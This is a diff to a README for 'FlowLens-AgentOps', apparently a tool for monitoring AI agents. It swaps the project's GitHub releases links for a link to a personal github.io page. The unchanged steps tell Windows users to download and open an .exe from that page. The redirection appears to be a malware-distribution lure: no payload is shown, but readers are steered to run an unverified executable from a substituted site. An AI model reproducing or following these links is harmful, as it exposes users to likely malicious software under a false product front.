@@ -1,6 +1,6 @@
 # 🔍 FlowLens-AgentOps - View and fix your digital agents
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Conflictofinteresteddy300/FlowLens-AgentOps/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://conflictofinteresteddy300.github.io)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to install the software on your Windows machine:
 
-1. Visit the following link to find the download page: [https://github.com/Conflictofinteresteddy300/FlowLens-AgentOps/releases](https://github.com/Conflictofinteresteddy300/FlowLens-AgentOps/releases).
+1. Visit the following link to find the download page: [https://conflictofinteresteddy300.github.io](https://conflictofinteresteddy300.github.io).
 2. Look for the "Assets" section at the bottom of the newest release post.
 3. Select the file ending in `.exe` to begin your download.
 4. Open the downloaded file once your browser finishes the transfer.
